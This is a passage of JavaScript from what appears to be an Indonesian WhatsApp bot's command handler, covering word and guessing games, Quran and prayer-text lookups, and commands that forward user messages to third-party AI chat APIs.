					}, {
						quoted: m
					})
					tictactoe[room.id] = room
				}
			}
			break
			case 'akinator': {
			     
				if (text == 'start') {
					if (akinator[m.sender]) return sycreply('Masih Ada Sesi Yang Belum Diselesaikan!')
					akinator[m.sender] = new Akinator({
						region: 'id',
						childMode: false
					});
					await akinator[m.sender].start()
					let {
						key
					} = await sycreply(`🎮 Akinator Game :\n\n@${m.sender.split('@')[0]}\n${akinator[m.sender].question}\n\n- 0 - Ya\n- 1 - Tidak\n- 2 - Tidak Tau\n- 3 - Mungkin\n- 4 - Mungkin Tidak\n\n${prefix + command} end (Untuk Keluar dari sesi)`)
					sych.sendMessage(m.chat, {
						react: {
							text: '🛜', // Emoji yang diinginkan
							key: m.key // Memberikan reaksi pada pesan yang baru saja dikirim
						}
					});
					akinator[m.sender].key = key.id
					akinator[m.sender].waktu = setTimeout(() => {
						if (akinator[m.sender]) sycreply(`_Waktu ${command} habis_`)
						delete akinator[m.sender];
					}, 3600000)
				} else if (text == 'end') {
					if (!akinator[m.sender]) return sycreply('Kamu tidak Sedang bermain Akinator!')
					delete akinator[m.sender];
					sycreply('Sukses Mengakhiri sessi Akinator')
				} else sycreply(`*< / >* Example : ${prefix + command} start/end`)
			}
			break
			case 'tebakbom': {
			     
				if (tebakbom[m.sender]) return sycreply('Masih Ada Sesi Yang Belum Diselesaikan!')
				tebakbom[m.sender] = {
					petak: [0, 0, 0, 2, 0, 2, 0, 2, 0, 0].sort(() => Math.random() - 0.5),
					board: ['1️⃣', '2️⃣', '3️⃣', '4️⃣', '5️⃣', '6️⃣', '7️⃣', '8️⃣', '9️⃣', '🔟'],
					bomb: 3,
					lolos: 7,
					pick: 0,
					nyawa: ['❤️', '❤️', '❤️'],
					waktu: setTimeout(() => {
						if (tebakbom[m.sender]) sycreply(`_Waktu ${command} habis_`)
						delete tebakbom[m.sender];
					}, 120000)
				}
				sycreply(`*TEBAK BOM*\n\n${tebakbom[m.sender].board.join("")}\n\nPilih lah nomor tersebut! dan jangan sampai terkena Bom!\nBomb : ${tebakbom[m.sender].bomb}\nNyawa : ${tebakbom[m.sender].nyawa.join("")}`);
				sych.sendMessage(m.chat, {
					react: {
						text: '💣', // Emoji yang diinginkan
						key: m.key // Memberikan reaksi pada pesan yang baru saja dikirim
					}
				});
			}
			break
			case 'tekateki': {
			     
				if (iGame(tekateki, m.chat)) return sycreply('Masih Ada Sesi Yang Belum Diselesaikan!')
				const hasil = pickRandom(await fetchJson('https://raw.githubusercontent.com/nazedev/database/refs/heads/master/games/tekateki.json'));
				let {
					key
				} = await sycreply(`🎮 Teka Teki Berikut :\n\n${hasil.soal}\n\nWaktu : 60s\nHadiah *+3499*`)
				sych.sendMessage(m.chat, {
					react: {
						text: '🔑', // Emoji yang diinginkan
						key: m.key // Memberikan reaksi pada pesan yang baru saja dikirim
					}
				});
				tekateki[m.chat + key.id] = {
					jawaban: hasil.jawaban.toLowerCase(),
					id: key.id
				}
				await sleep(60000)
				if (rdGame(tekateki, m.chat, key.id)) {
					sycreply('Waktu Habis\nJawaban: ' + tekateki[m.chat + key.id].jawaban)
					delete tekateki[m.chat + key.id]
				}
			}
			break
			case 'tebaklirik': {
			     
				if (iGame(tebaklirik, m.chat)) return sycreply('Masih Ada Sesi Yang Belum Diselesaikan!')
				const hasil = pickRandom(await fetchJson('https://raw.githubusercontent.com/nazedev/database/refs/heads/master/games/tebaklirik.json'));
				let {
					key
				} = await sycreply(`🎮 Tebak Lirik Berikut :\n\n${hasil.soal}\n\nWaktu : 90s\nHadiah *+4299*`)
				sych.sendMessage(m.chat, {
					react: {
						text: '🎼', // Emoji yang diinginkan
						key: m.key // Memberikan reaksi pada pesan yang baru saja dikirim
					}
				});
				tebaklirik[m.chat + key.id] = {
					jawaban: hasil.jawaban.toLowerCase(),
					id: key.id
				}
				await sleep(90000)
				if (rdGame(tebaklirik, m.chat, key.id)) {
					sycreply('Waktu Habis\nJawaban: ' + tebaklirik[m.chat + key.id].jawaban)
					delete tebaklirik[m.chat + key.id]
				}
			}
			break
			case 'listsurah': {
			     
				try {
					const surahList = ["1. Al-Fatihah", "2. Al-Baqarah", "3. Ali Imran", "4. An-Nisa", "5. Al-Ma'idah", "6. Al-An'am", "7. Al-A'raf", "8. Al-Anfal", "9. At-Tawbah", "10. Yunus", "11. Hud", "12. Yusuf", "13. Ar-Ra'd", "14. Ibrahim", "15. Al-Hijr", "16. An-Nahl", "17. Al-Isra", "18. Al-Kahf", "19. Maryam", "20. Ta-Ha", "21. Al-Anbiya", "22. Al-Hajj", "23. Al-Mu'minun", "24. An-Nur", "25. Al-Furqan", "26. Ash-Shu'ara", "27. An-Naml", "28. Al-Qasas", "29. Al-Ankabut", "30. Ar-Rum", "31. Luqman", "32. As-Sajdah", "33. Al-Ahzab", "34. Saba'", "35. Fatir", "36. Ya-Sin", "37. As-Saffat", "38. Sad", "39. Az-Zumar", "40. Ghafir", "41. Fussilat", "42. Ash-Shura", "43. Az-Zukhruf", "44. Ad-Dukhan", "45. Al-Jathiyah", "46. Al-Ahqaf", "47. Muhammad", "48. Al-Fath", "49. Al-Hujurat", "50. Qaf", "51. Az-Zariyat", "52. At-Tur", "53. An-Najm", "54. Al-Qamar", "55. Ar-Rahman", "56. Al-Waqi'ah", "57. Al-Hadid", "58. Al-Mujadilah", "59. Al-Hashr", "60. Al-Mumtahanah", "61. As-Saff", "62. Al-Jumu'ah", "63. Al-Munafiqun", "64. At-Taghabun", "65. At-Talaq", "66. At-Tahrim", "67. Al-Mulk", "68. Al-Qalam", "69. Al-Haqqah", "70. Al-Ma'arij", "71. Nuh", "72. Al-Jinn", "73. Al-Muzzammil", "74. Al-Muddathir", "75. Al-Qiyamah", "76. Al-Insan", "77. Al-Mursalat", "78. An-Naba'", "79. An-Nazi'at", "80. Abasa", "81. At-Takwir", "82. Al-Infitar", "83. Al-Mutaffifin", "84. Al-Inshiqaq", "85. Al-Buruj", "86. At-Tariq", "87. Al-A'la", "88. Al-Ghashiyah", "89. Al-Fajr", "90. Al-Balad", "91. Ash-Shams", "92. Al-Lail", "93. Ad-Duhaa", "94. Al-Inshirah", "95. At-Tin", "96. Al-'Alaq", "97. Al-Qadr", "98. Al-Bayyinah", "99. Az-Zalzalah", "100. Al-Adiyat", "101. Al-Qari'ah", "102. At-Takathur", "103. Al-Asr", "104. Al-Humazah", "105. Al-Fil", "106. Quraysh", "107. Al-Ma'un", "108. Al-Kawthar", "109. Al-Kafirun", "110. An-Nasr", "111. Al-Masad", "112. Al-Ikhlas", "113. Al-Falaq", "114. An-Nas"];
					const surahMessage = `*Daftar Surah Al-Qur'an:*\n\n${surahList.join('\n')}`;
					sycreply(surahMessage);
					sych.sendMessage(m.chat, {
						react: {
							text: '🕋', // Emoji yang diinginkan
							key: m.key // Memberikan reaksi pada pesan yang baru saja dikirim
						}
					});
				} catch (error) {
					console.error('Error:', error.message);
					sycreply('Terjadi kesalahan saat menampilkan daftar surah.');
				}
			}
			break;
			case 'bacaansholat': {
			     
				const bacaanshalat = {
					"result": [{
						"id": 1,
						"name": "Bacaan Iftitah",
						"arabic": "اللَّهُ أَكْبَرُ كَبِيرًا وَالْحَمْدُ لِلَّهِ كَثِيرًا وَسُبْحَانَ اللَّهِ بُكْرَةً وَأَصِيلاً , إِنِّى وَجَّهْتُ وَجْهِىَ لِلَّذِى فَطَرَ السَّمَوَاتِ وَالأَرْضَ حَنِيفًا وَمَا أَنَا مِنَ الْمُشْرِكِينَ إِنَّ صَلاَتِى وَنُسُكِى وَمَحْيَاىَ وَمَمَاتِى لِلَّهِ رَبِّ الْعَالَمِينَ لاَ شَرِيكَ لَهُ وَبِذَلِكَ أُمِرْتُ وَأَنَا أَوَّلُ الْمُسْلِمِينَ",
						"latin": "Alloohu akbar kabiirow wal hamdu lillaahi katsiiroo wasubhaanalloohi bukrotaw wa-ashiilaa, Innii wajjahtu wajhiya lilladzii fathoros samaawaati wal ardlo haniifaa wamaa ana minal musyrikiin. Inna sholaatii wa nusukii wamahyaa wa mamaatii lillaahi robbil &lsquo;aalamiin. Laa syariikalahu wa bidzaalika umirtu wa ana awwalul muslimiin",
						"terjemahan": "Allah Maha Besar dengan sebesar-besarnya, segala puji bagi Allah dengan pujian yang banyak. Mahasuci Allah pada waktu pagi dan petang, Sesungguhnya aku hadapkan wajahku kepada Allah yang telah menciptakan langit dan bumi dalam keadaan tunduk dan aku bukanlah dari golongan orang-orang musyrik. Sesungguhnya shalatku, sembelihanku, hidupku dan matiku hanya untuk Allah Tuhan semesta alam. Tidak ada sekutu bagiNya. Dan dengan yang demikian itu lah aku diperintahkan. Dan aku adalah orang yang pertama berserah diri"
					}, {
						"id": 2,
						"name": "Al Fatihah",
						"arabic": "بِسْمِ اللَّـهِ الرَّحْمَـٰنِ الرَّحِيمِ ﴿١﴾الْحَمْدُ لِلَّـهِ رَبِّ الْعَالَمِينَ ﴿٢﴾ الرَّحْمَـٰنِ الرَّحِيمِ ﴿٣﴾ مَالِكِ يَوْمِ الدِّينِ ﴿٤﴾ إِيَّاكَ نَعْبُدُ وَإِيَّاكَ نَسْتَعِينُ ﴿٥﴾ اهْدِنَا   الصِّرَاطَ الْمُسْتَقِيمَ ﴿٦﴾ صِرَاطَ الَّذِينَ أَنْعَمْتَ عَلَيْهِمْ غَيْرِ الْمَغْضُوبِ عَلَيْهِمْ وَلَا الضَّالِّينَ ﴿٧",
						"latin": "1. Bismillahirrahmanirrahim, 2. Alhamdulillahi rabbil alamin, 3. Arrahmaanirrahiim, 4. Maaliki yaumiddiin, 5. Iyyaka nabudu waiyyaaka nastaiin, 6. Ihdinashirratal mustaqim, 7. shiratalladzina an&rsquo;amta alaihim ghairil maghduubi alaihim waladhaalin",
						"terjemahan": "1. Dengan menyebut nama Allah Yang Maha Pemurah lagi Maha Penyayang, 2. Segala puji bagi Allah, Tuhan semesta alam, 3. Maha Pemurah lagi Maha Penyayang, 4. Yang menguasai di Hari Pembalasan, 5. Hanya Engkaulah yang kami sembah, dan hanya kepada Engkaulah kami meminta pertolongan, 6. Tunjukilah kami jalan yang lurus, 7. (yaitu) Jalan orang-orang yang telah Engkau beri nikmat kepada mereka; bukan (jalan) mereka yang dimurkai dan bukan (pula jalan) mereka yang sesat"
					}, {
						"id": 3,
						"name": "Bacaan Ruku",
						"arabic": "(3x) سُبْحَانَ رَبِّيَ الْعَظِيْمِ وَبِحَمْدِهِ",
						"latin": "Subhana Rabbiyal Adzimi Wabihamdih (3x)",
						"terjemahan": "Maha Suci Tuhanku Yang Maha Agung Dan Dengan Memuji-Nya"
					}, {
						"id": 4,
						"name": "Bacaan Sujud",
						"arabic": "(3x) سُبْحَانَ رَبِّىَ الْأَعْلَى وَبِحَمْدِهِ",
						"latin": "Subhaana robbiyal a'la wabihamdih (3x)",
						"terjemahan": "Mahasuci Tuhanku yang Mahatinggi dan segala puji bagiNya"
					}, {
						"id": 5,
						"name": "Bacaan Duduk Diantara Dua Sujud",
						"arabic": "رَبِّ اغْفِرْلِيْ وَارْحَمْنِيْ وَاجْبُرْنِيْ وَارْفَعْنِيْ وَارْزُقْنِيْ وَاهْدِنِيْ وَعَافِنِيْ وَاعْفُ عَنِّيْ",
						"latin": "Rabbighfirli Warhamni Wajburnii Warfaknii Wazuqnii Wahdinii Wa'aafinii Wa'fuannii",
						"terjemahan": "Ya Allah,ampunilah dosaku,belas kasihinilah aku dan cukuplah segala kekuranganku da angkatlah derajatku dan berilah rezeki kepadaku,dan berilah aku petunjuk dan berilah kesehatan padaku dan berilah ampunan kepadaku"
					}, {
						"id": 6,
						"name": "Duduk Tasyahud Awal",
						"arabic": "اَلتَّحِيَّاتُ الْمُبَارَكَاتُ الصَّلَوَاتُ الطَّيِّبَاتُ ِللهِ، السَّلاَمُ عَلَيْكَ اَيُّهَا النَّبِيُّ وَرَحْمَةُ اللهِ وَبَرَكَاتُهُ، السَّلاَمُ عَلَيْنَا وَعَلَى عِبَادِاللهِ الصَّالِحِيْنَ، أَشْهَدُ اَنْ لآ إِلَهَ إِلاَّاللهُ وَاَشْهَدُ أَنَّ مُحَمَّدًا رَسُوْلُ اللهُ، اَللهُمَّ صَلِّ عَلَى سَيِّدِنَا مُحَمَّدٍ",
						"latin": "Attahiyyaatul mubaarokaatush sholawaatuth thoyyibaatu lillaah. Assalaamualaika ayyuhan nabiyyu wa rohmatulloohi wa barokaatuh. Assalaaamualainaa wa alaa ibaadillaahish shoolihiin. Asyhadu allaa ilaaha illallooh wa asyhadu anna Muhammadar rosuulullooh. Allahummasholli ala Sayyidina Muhammad",
						"terjemahan": "Segala penghormasych, keberkahan, shalawat dan kebaikan hanya bagi Allah. Semoga salam sejahtera selalu tercurahkan kepadamu wahai Nabi, demikian pula rahmat Allah dan berkahNya dan semoga salam sejahtera selalu tercurah kepada kami dan hamba-hamba Allah yang shalih. Aku bersaksi bahwa tiada ilah kecuali Allah dan aku bersaksi bahwa Muhammad adalah utusan Allah. Ya Tuhan kami, selawatkanlah ke atas Nabi Muhammad"
					}, {
						"id": 7,
						"name": "Duduk Tasyahud Akhir",
						"arabic": "اَلتَّحِيَّاتُ الْمُبَارَكَاتُ الصَّلَوَاتُ الطَّيِّبَاتُ ِللهِ، السَّلاَمُ عَلَيْكَ اَيُّهَا النَّبِيُّ وَرَحْمَةُ اللهِ وَبَرَكَاتُهُ، السَّلاَمُ عَلَيْنَا وَعَلَى عِبَادِاللهِ الصَّالِحِيْنَ، أَشْهَدُ اَنْ لآ إِلَهَ إِلاَّاللهُ وَاَشْهَدُ أَنَّ مُحَمَّدًا رَسُوْلُ اللهُ، اَللهُمَّ صَلِّ عَلَى سَيِّدِنَا مُحَمَّدٍ وَعَلَى آلِ سَيِّدِنَا مُحَمَّدٍ، كَمَا صَلَّيْتَ عَلَى سَيِّدِنَا اِبْرَاهِيْمَ وَعَلَى آلِ سَيِّدِنَا اِبْرَاهِيْمَ وَبَارِكْ عَلَى سَيِّدِنَا مُحَمَّدٍ وَعَلَى آلِ سَيِّدِنَا مُحَمَّدٍ كَمَا بَرَكْتَ عَلَى سَيِّدِنَا اِبْرَاهِيْمَ وَعَلَى آلِ سَيِّدِنَا اِبْرَاهِيْمَ فِى الْعَالَمِيْنَ إِنَّكَ حَمِيْدٌ مَجِيْدٌ",
						"latin": "Attahiyyaatul mubaarokaatush sholawaatuth thoyyibaatu lillaah. Assalaamualaika ayyuhan nabiyyu wa rohmatulloohi wa barokaatuh. Assalaaamualainaa wa alaa ibaadillaahish shoolihiin. Asyhadu allaa ilaaha illallooh wa asyhadu anna Muhammadar rosuulullooh. Allahumma Shalli Ala Sayyidina Muhammad Wa Ala Ali Sayyidina Muhammad. Kama Shollaita Ala Sayyidina Ibrahim wa alaa aali sayyidina Ibrahim, wabaarik ala Sayyidina Muhammad Wa Alaa Ali Sayyidina Muhammad, Kama barokta alaa Sayyidina Ibrahim wa alaa ali Sayyidina Ibrahim, Fil aalamiina innaka hamiidummajid",
						"terjemahan": "Segala penghormatan yang berkat solat yang baik adalah untuk Allah. Sejahtera atas engkau wahai Nabi dan rahmat Allah serta keberkatannya. Sejahtera ke atas kami dan atas hamba-hamba Allah yang soleh. Aku bersaksi bahwa tiada Tuhan melainkan Allah dan aku bersaksi bahwasanya Muhammad itu adalah pesuruh Allah. Ya Tuhan kami, selawatkanlah ke atas Nabi Muhammad dan ke atas keluarganya. Sebagaimana Engkau selawatkan ke atas Ibrahim dan atas keluarga Ibrahim. Berkatilah ke atas Muhammad dan atas keluarganya sebagaimana Engkau berkati ke atas Ibrahim dan atas keluarga Ibrahim di dalam alam ini. Sesungguhnya Engkau Maha Terpuji lagi Maha Agung"
					}, {
						"id": 8,
						"name": "Salam",
						"arabic": "اَلسَّلاَمُ عَلَيْكُمْ وَرَحْمَةُ اللهِ وَبَرَكَاتُهُ",
						"latin": "Assalamualaikum Warohmatullahi Wabarokatuh",
						"terjemahan": "Semoga keselamatan, rohmat dan berkah ALLAH selalu tercurah untuk kamu sekalian."
					}]
				}
				let bacaan = JSON.stringify(bacaanshalat)
				let json = JSON.parse(bacaan)
				let data = json.result.map((v, i) => `${i + 1}. ${v.name}\n${v.arabic}\n${v.latin}\n*Artinya:*\n_"${v.terjemahan}"_`).join('\n\n')
				let contoh = `*「 Bacaan Shalat 」*\n\n`
				sycreply(`${contoh} + ${data}`)
			}
			break
			case 'listdoa': {
			     
				try {
					// Ambil data dari API
					const response = await fetch('https://doa-doa-api-ahmadramadhan.fly.dev/api');
					const doaList = await response.json();
					// Format pesan
					const doaMessage = `*Daftar Doa Harian:*\n\n${doaList.map(doa => `${doa.id}. ${doa.doa}`).join('\n')}`;
					// Kirim pesan
					sycreply(doaMessage);
					// Kirim reaksi (opsional)
					sych.sendMessage(m.chat, {
						react: {
							text: '🙏', // Emoji reaksi
							key: m.key // Memberikan reaksi pada pesan yang baru saja dikirim
						}
					});
				} catch (error) {
					console.error('Error fetching doa list:', error.message);
					sycreply('Terjadi kesalahan saat menampilkan daftar doa.');
				}
				break;
			}
			case 'doa': {
			     
				try {
					// Ambil ID doa dari argumen
					const id = args[0];
					if (!id) {
						return sycreply('Mohon masukkan ID doa. Contoh: *doa 1*');
					}
					// Menambahkan pesan loading dan menyimpan key untuk edit nanti
					let {
						key
					} = await sycreply('Mencari doa, mohon tunggu...');

// Emoji yang akan digunakan
const reactEmojis = ["⏳", "🕛", "🕒", "🕕", "🕘", "🕛", "✅"];

// Mengirimkan reaksi secara berurutan
for (const emoji of reactEmojis) {
    await sych.sendMessage(m.chat, {
        react: {
            text: emoji,
            key: m.key
        }
    });
}
					// Ambil data dari API berdasarkan ID
					const response = await fetch(`https://doa-doa-api-ahmadramadhan.fly.dev/api/${id}`);
					const doaData = await response.json();
					if (doaData.length === 0) {
						return sycreply('Doa dengan ID tersebut tidak ditemukan.', {
							edit: key
						});
					}
					const doa = doaData[0]; // Ambil data pertama (berdasarkan struktur API)
					// Format pesan
					const doaMessage = `*Doa: ${doa.doa}*\n\n` + `*Ayat:*\n${doa.ayat}\n\n` + `*Latin:*\n${doa.latin}\n\n` + `*Artinya:*\n${doa.artinya}`;
					// Kirim pesan setelah mengambil data
					sycreply(doaMessage, {
						edit: key
					});
					// Kirim reaksi (opsional)
					sych.sendMessage(m.chat, {
						react: {
							text: '🙏', // Emoji reaksi
							key: m.key // Memberikan reaksi pada pesan yang baru saja dikirim
						}
					});
				} catch (error) {
					console.error('Error fetching doa:', error.message);
					sycreply('Terjadi kesalahan saat menampilkan doa.', {
						edit: key
					});
				}
				break;
			}
			case 'quran': {
			     
				if (!text) return sycreply(`*${prefix + command}* Masukkan nomor surah!`);
				const surahNumber = parseInt(text);
				if (isNaN(surahNumber) || surahNumber < 1 || surahNumber > 114) {
					return sycreply('Nomor surah tidak valid! Masukkan angka antara 1 hingga 114.');
				}
				// Array of surah names
				const surahNames = ["Al-Fatihah", "Al-Baqarah", "Ali Imran", "An-Nisa", "Al-Ma'idah", "Al-An'am", "Al-A'raf", "Al-Anfal", "At-Tawbah", "Yunus", "Hud", "Yusuf", "Ar-Ra'd", "Ibrahim", "Al-Hijr", "An-Nahl", "Al-Isra", "Al-Kahf", "Maryam", "Ta-Ha", "Al-Anbiya", "Al-Hajj", "Al-Mu'minun", "An-Nur", "Al-Furqan", "Ash-Shu'ara", "An-Naml", "Al-Qasas", "Al-Ankabut", "Ar-Rum", "Luqman", "As-Sajdah", "Al-Ahzab", "Saba'", "Fatir", "Ya-Sin", "As-Saffat", "Sad", "Az-Zumar", "Ghafir", "Fussilat", "Ash-Shura", "Az-Zukhruf", "Ad-Dukhan", "Al-Jathiyah", "Al-Ahqaf", "Muhammad", "Al-Fath", "Al-Hujurat", "Qaf", "Az-Zariyat", "At-Tur", "An-Najm", "Al-Qamar", "Ar-Rahman", "Al-Waqi'ah", "Al-Hadid", "Al-Mujadilah", "Al-Hashr", "Al-Mumtahanah", "As-Saff", "Al-Jumu'ah", "Al-Munafiqun", "At-Taghabun", "At-Talaq", "At-Tahrim", "Al-Mulk", "Al-Qalam", "Al-Haqqah", "Al-Ma'arij", "Nuh", "Al-Jinn", "Al-Muzzammil", "Al-Muddathir", "Al-Qiyamah", "Al-Insan", "Al-Mursalat", "An-Naba'", "An-Nazi'at", "Abasa", "At-Takwir", "Al-Infitar", "Al-Mutaffifin", "Al-Inshiqaq", "Al-Buruj", "At-Tariq", "Al-A'la", "Al-Ghashiyah", "Al-Fajr", "Al-Balad", "Ash-Shams", "Al-Lail", "Ad-Duhaa", "Al-Inshirah", "At-Tin", "Al-'Alaq", "Al-Qadr", "Al-Bayyinah", "Az-Zalzalah", "Al-Adiyat", "Al-Qari'ah", "At-Takathur", "Al-Asr", "Al-Humazah", "Al-Fil", "Quraysh", "Al-Ma'un", "Al-Kawthar", "Al-Kafirun", "An-Nasr", "Al-Masad", "Al-Ikhlas", "Al-Falaq", "An-Nas"];
				// Menambahkan pesan loading dan menyimpan key untuk edit nanti
				let {
					key
				} = await sycreply('Mencari surah, mohon tunggu...');

// Emoji yang akan digunakan
const reactEmojis = ["⏳", "🕛", "🕒", "🕕", "🕘", "🕛", "✅"];

// Mengirimkan reaksi secara berurutan
for (const emoji of reactEmojis) {
    await sych.sendMessage(m.chat, {
        react: {
            text: emoji,
            key: m.key
        }
    });
}
				try {
					console.log(`Mengambil data surah nomor ${surahNumber}...`);
					const response = await fetch(`https://api.siputzx.my.id/api/s/surah?no=${surahNumber}`);
					if (!response.ok) throw new Error('Gagal mengambil data dari API');
					const data = await response.json();
					if (!data.status || !data.data || data.data.length === 0) {
						return sycreply('Surah tidak ditemukan atau data tidak tersedia.', {
							edit: key
						});
					}
					// Get surah name from the array
					const surahName = surahNames[surahNumber - 1];
					let quranMessage = `*Surah Nomor ${surahNumber}: ${surahName}*\n\n`;
					for (const ayat of data.data) {
						quranMessage += `*Arab*: ${ayat.arab}\n`;
						quranMessage += `*Latin*: ${ayat.latin}\n`;
						quranMessage += `*Indo*: ${ayat.indo}\n\n`;
					}
					console.log('Data berhasil diambil, mengirim pesan...');
					sycreply(quranMessage.trim(), {
						edit: key
					});
					sych.sendMessage(m.chat, {
						react: {
							text: '🕌', // Emoji yang diinginkan
							key: m.key // Memberikan reaksi pada pesan yang baru saja dikirim
						}
					});
				} catch (error) {
					console.error('Error saat mengambil data:', error.message);
					sycreply('Terjadi kesalahan saat mengambil data surah. Coba lagi nanti.', {
						edit: key
					});
				}
			}
			break;
			case 'tebakkata': {
			     
				if (iGame(tebakkata, m.chat)) return sycreply('Masih Ada Sesi Yang Belum Diselesaikan!')
				const hasil = pickRandom(await fetchJson('https://raw.githubusercontent.com/nazedev/database/refs/heads/master/games/tebakkata.json'));
				let {
					key
				} = await sycreply(`🎮 Tebak Kata Berikut :\n\n${hasil.soal}\n\nWaktu : 60s\nHadiah *+3499*`)
				tebakkata[m.chat + key.id] = {
					jawaban: hasil.jawaban.toLowerCase(),
					id: key.id
				}
				await sleep(60000)
				if (rdGame(tebakkata, m.chat, key.id)) {
					sycreply('Waktu Habis\nJawaban: ' + tebakkata[m.chat + key.id].jawaban)
					delete tebakkata[m.chat + key.id]
				}
			}
			break
			case 'family100': {
			     
				if (family100.hasOwnProperty(m.chat)) return sycreply('Masih Ada Sesi Yang Belum Diselesaikan!')
				const hasil = pickRandom(await fetchJson('https://raw.githubusercontent.com/nazedev/database/refs/heads/master/games/family100.json'));
				let {
					key
				} = await sycreply(`🎮 Tebak Kata Berikut :\n\n${hasil.soal}\n\nWaktu : 5m\nHadiah *+3499*`)
				sych.sendMessage(m.chat, {
					react: {
						text: '💯', // Emoji yang diinginkan
						key: m.key // Memberikan reaksi pada pesan yang baru saja dikirim
					}
				});
				family100[m.chat] = {
					soal: hasil.soal,
					jawaban: hasil.jawaban,
					terjawab: Array.from(hasil.jawaban, () => false),
					id: key.id
				}
				await sleep(300000)
				if (family100.hasOwnProperty(m.chat)) {
					sycreply('Waktu Habis\nJawaban:\n- ' + family100[m.chat].jawaban.join('\n- '))
					delete family100[m.chat]
				}
			}
			break
			case 'susunkata': {
			     
				if (iGame(susunkata, m.chat)) return sycreply('Masih Ada Sesi Yang Belum Diselesaikan!')
				const hasil = pickRandom(await fetchJson('https://raw.githubusercontent.com/nazedev/database/refs/heads/master/games/susunkata.json'));
				let {
					key
				} = await sycreply(`🎮 Susun Kata Berikut :\n\n${hasil.soal}\nTipe : ${hasil.tipe}\n\nWaktu : 60s\nHadiah *+2989*`)
				sych.sendMessage(m.chat, {
					react: {
						text: '📝', // Emoji yang diinginkan
						key: m.key // Memberikan reaksi pada pesan yang baru saja dikirim
					}
				});
				susunkata[m.chat + key.id] = {
					jawaban: hasil.jawaban.toLowerCase(),
					id: key.id
				}
				await sleep(60000)
				if (rdGame(susunkata, m.chat, key.id)) {
					sycreply('Waktu Habis\nJawaban: ' + susunkata[m.chat + key.id].jawaban)
					delete susunkata[m.chat + key.id]
				}
			}
			break
			case 'tebakkimia': {
			     
				if (iGame(tebakkimia, m.chat)) return sycreply('Masih Ada Sesi Yang Belum Diselesaikan!')
				const hasil = pickRandom(await fetchJson('https://raw.githubusercontent.com/nazedev/database/refs/heads/master/games/tebakkimia.json'));
				let {
					key
				} = await sycreply(`🎮 Tebak Kimia Berikut :\n\n${hasil.unsur}\n\nWaktu : 60s\nHadiah *+3499*`)
				tebakkimia[m.chat + key.id] = {
					jawaban: hasil.lambang.toLowerCase(),
					id: key.id
				}
				await sleep(60000)
				if (rdGame(tebakkimia, m.chat, key.id)) {
					sycreply('Waktu Habis\nJawaban: ' + tebakkimia[m.chat + key.id].jawaban)
					delete tebakkimia[m.chat + key.id]
				}
			}
			break
			case 'caklontong': {
			     
				if (iGame(caklontong, m.chat)) return sycreply('Masih Ada Sesi Yang Belum Diselesaikan!')
				const hasil = pickRandom(await fetchJson('https://raw.githubusercontent.com/nazedev/database/refs/heads/master/games/caklontong.json'));
				let {
					key
				} = await sycreply(`🎮 Jawab Pertanyaan Berikut :\n\n${hasil.soal}\n\nWaktu : 60s\nHadiah *+9999*`)
				sych.sendMessage(m.chat, {
					react: {
						text: '⁉️', // Emoji yang diinginkan
						key: m.key // Memberikan reaksi pada pesan yang baru saja dikirim
					}
				});
				caklontong[m.chat + key.id] = {
					...hasil,
					jawaban: hasil.jawaban.toLowerCase(),
					id: key.id
				}
				await sleep(60000)
				if (rdGame(caklontong, m.chat, key.id)) {
					sycreply(`Waktu Habis\nJawaban: ${caklontong[m.chat + key.id].jawaban}\n"${caklontong[m.chat + key.id].deskripsi}"`)
					delete caklontong[m.chat + key.id]
				}
			}
			break
			case 'aitukam': {
			     
				if (!text && (!m.quoted || !m.quoted.text)) return sycreply(`Kirim/reply pesan *${prefix + command}* Teksnya`);
				try {
					// Mengambil teks dari pesan atau pesan yang diteruskan
					const query = text || m.quoted.text;
					// Mengambil respons dari API
					const hasil = await fetchJson(`https://api.siputzx.my.id/api/ai/latukam?content=${encodeURIComponent(query)}`);
					// Mengecek apakah API memberikan respons yang benar
					if (hasil.status === true && hasil.data) {
						sycreply(hasil.data); // Mengirim balasan sesuai respons dari API
					} else {
						sycreply('Terjadi kesalahan saat mengambil data dari API!');
					}
				} catch (error) {
					sycreply('Terjadi kesalahan saat mengambil data dari API!');
					console.error('Error saat mengambil data dari API:', error);
				}
			}
			break;
			case 'meta': {
			     
				if (!text && (!m.quoted || !m.quoted.text)) return sycreply(`Kirim/reply pesan *${prefix + command}* Teksnya`);
				try {
					// Mengambil teks dari pesan atau pesan yang diteruskan
					const query = text || m.quoted.text;
					// Mengambil respons dari API
					const hasil = await fetchJson(`https://api.siputzx.my.id/api/ai/metaai?query=${encodeURIComponent(query)}`);
					// Mengecek apakah API memberikan respons yang benar
					if (hasil.status === true && hasil.data) {
						sycreply(hasil.data); // Mengirim balasan sesuai respons dari API
					} else {
						sycreply('Terjadi kesalahan saat mengambil data dari API!');
					}
				} catch (error) {
					sycreply('Terjadi kesalahan saat mengambil data dari API!');
					console.error('Error saat mengambil data dari API:', error);
				}
			}
			break;
			case 'luminai': {
			     
    // Cek apakah ada teks yang dikirim atau teks dari pesan yang dikutip
    if (!text && (!m.quoted || !m.quoted.text)) return sycreply(`Kirim/reply pesan *${prefix + command}* Teksnya`);

    try {
        // Mengambil teks dari pesan atau pesan yang dikutip
        const query = text || m.quoted.text;

        // Mengambil respons dari API
        const hasil = await fetchJson(`https://api.siputzx.my.id/api/ai/luminai?content=${encodeURIComponent(query)}`);

        // Mengecek apakah API memberikan respons yang benar
        if (hasil.status === true && hasil.data) {
            sycreply(hasil.data); // Mengirim balasan sesuai respons dari API
        } else {
            sycreply('Terjadi kesalahan saat mengambil data dari API!');
        }
    } catch (error) {
        sycreply('Terjadi kesalahan saat mengambil data dari API!');
        console.error('Error saat mengambil data dari API:', error);
    }
}
break;
case 'esia': {
     
    // Cek apakah ada teks yang dikirim atau teks dari pesan yang dikutip
    if (!text && (!m.quoted || !m.quoted.text)) return sycreply(`Kirim/reply pesan *${prefix + command}* Teksnya`);

    try {
        // Mengambil teks dari pesan atau pesan yang dikutip
        const query = text || m.quoted.text;

        // Mengambil respons dari API
        const hasil = await fetchJson(`https://api.siputzx.my.id/api/ai/esia?content=${encodeURIComponent(query)}`);

        // Mengecek apakah API memberikan respons yang benar
        if (hasil.status === true && hasil.data) {
            sycreply(hasil.data); // Mengirim balasan sesuai respons dari API
        } else {
            sycreply('Terjadi kesalahan saat mengambil data dari API!');
        }
    } catch (error) {
        sycreply('Terjadi kesalahan saat mengambil data dari API!');
        console.error('Error saat mengambil data dari API:', error);
    }
}
break;
case 'gemini': {
     
    // Cek apakah ada teks yang dikirim atau teks dari pesan yang dikutip
